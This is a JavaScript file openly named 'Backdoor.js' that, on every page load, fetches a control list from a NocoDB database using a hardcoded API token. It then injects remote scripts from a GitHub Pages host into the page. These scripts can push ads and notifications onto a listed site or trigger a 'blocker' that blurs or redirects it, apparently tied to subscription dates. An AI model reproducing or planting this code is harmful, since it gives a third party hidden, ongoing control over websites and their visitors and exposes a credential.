/*!
 * Backdoor.js v1.0.3a
 * (c) 2024-2024
 * by Deus Notam
 * Telegram → https://t.me/d3usn0tam
 */

// Проверяем, был ли ранее подключен файл
if (!window.D3usN0tam) {
  console.log("%cD3usN0tam System%c - %cConnected!%c\n\nMade by Daniel Abros\nNotion Site → https://deusnotam.notion.site/D3usN0tam-System-ba149f69de214fd3ba0b9df834eb2c6e?pvs=4\nTelegram → https://t.me/d3usn0tam", "font-weight: bold;", "", "color: #25ba1a; font-weight: bold;", "");

  // Подключаем activator.js - скрипт проверки подключения
  const activatorScript = document.createElement('script');
  activatorScript.src = 'https://deusnotam.github.io/activator.js';
  document.head.appendChild(activatorScript);

  const options = {
    method: 'GET',
    headers: {
      'xc-token': 'bYaKMejF5O3qobp3pju52zTKFIigY2otFozi0lO3',
    },
  };

  fetch('https://app.nocodb.com/api/v1/db/data/noco/p2kmbphsgvqs8kz/mpqof3e6f1ueozo/views/vwz1zne8sfxvhxco', options)
    .then(response => response.json())
    .then(data => handleData(data))
    .catch(error => console.error('Ошибка при получении данных:', error));

  // Функция для обработки данных после fetch
  function handleData(data) {
    if (!data || !data.list || !Array.isArray(data.list)) {
      console.error('Ошибка: Полученные данные не соответствуют ожидаемой структуре');
      return;
    }

    const DNsite = data.list.map(item => ({
      name: item.SiteName,
      url: item.SiteURL,
      date: item.Subscribe,
      ads: item.ADS,
      noti: item.Noti,
      noti_title: item.NotiTitle,
      noti_text: item.NotiText,
      blocker: item.Blocker,
      blocker_effect: item.BlockerEffect,
      blocker_redirecturl: item.BlockerRedirectURL,
      blocker_blur_date: item.BlockerBlurDate,
      blocker_note: item.BlockerNote,
    }));

    // После завершения fetch вызываем checkDomain
    checkDomain(DNsite);
  }

  // Функция для проверки домена
  function checkDomain(DNsite) {
    const sites = DNsite;
    const currentDomain = window.location.hostname;

    // Проверяем, есть ли текущий домен в списке
    DeusSiteInfo = sites.find(site => {
      const siteHostname = new URL(site.url).hostname;
      return [currentDomain, "www." + currentDomain, "www." + siteHostname].includes(siteHostname);
    });

    if (!DeusSiteInfo) {
      console.log("%cD3usN0tam System%c\n\nСайт не найден в списке системы D3usN0tam.\nThe site was not found in the D3usN0tam system list.", "font-weight: bold;", "");
      return;
    }

    // Проверяем дату подписки
    const currentDate = new Date();
    const subscriptionDate = new Date(DeusSiteInfo.date);

    if (currentDate < subscriptionDate) {
      loadDynamicScripts(DeusSiteInfo);
    } else {
      console.log(`%cD3usN0tam System%c\n\nУ этого сайта закончилась подписка ${DeusSiteInfo.date}\nSubscription has expired for this site ${DeusSiteInfo.date}`, "font-weight: bold;", "");
    }
  }

  // Функция для динамической загрузки скриптов
  function loadDynamicScripts(DeusSiteInfo) {
    const scriptUrls = {
      ads: 'https://deusnotam.github.io/system/ads.js',
      blocker: 'https://deusnotam.github.io/system/blocker.js',
      noti: 'https://deusnotam.github.io/system/noti.js',
    };

    if (DeusSiteInfo.ads === "active") {
      loadScript(scriptUrls.ads);
    }
    if (DeusSiteInfo.blocker === "active") {
      loadScript(scriptUrls.blocker);
    }
    if (DeusSiteInfo.noti === "active") {
      loadScript(scriptUrls.noti);
    }
  }

  // Функция для динамической загрузки скрипта
  function loadScript(scriptUrl) {
    const script = document.createElement('script');
    script.src = scriptUrl;
    document.head.appendChild(script);
  }

  // Устанавливаем флаг, что файл подключен
  window.D3usN0tam = true;
}
